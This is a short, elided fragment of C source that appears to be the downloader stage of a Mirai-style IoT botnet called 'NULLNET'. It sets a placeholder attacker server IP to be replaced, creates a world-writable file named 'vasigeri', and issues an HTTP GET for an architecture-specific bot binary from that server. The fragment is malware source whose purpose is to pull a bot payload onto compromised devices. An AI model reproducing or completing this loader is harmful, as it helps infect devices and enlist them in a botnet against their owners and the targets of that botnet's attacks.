...
#define HTTP_SERVER utils_inet_addr(0,0,0,0) //REPLACE_IP_SERVER

#define EXEC_MSG            "NULLNET\n"
...
inline void run(void)
{
	...
	ffd = open("vasigeri", O_WRONLY | O_CREAT | O_TRUNC, 0777);
	...
	if (write(sfd, "GET /nullnet_bin_dir/nullnet_load." BOT_ARCH " HTTP/1.0\r\n\r\n", 17 + arch_strlen + 13) != (17 + arch_strlen + 13))
	{
#ifdef DEBUG
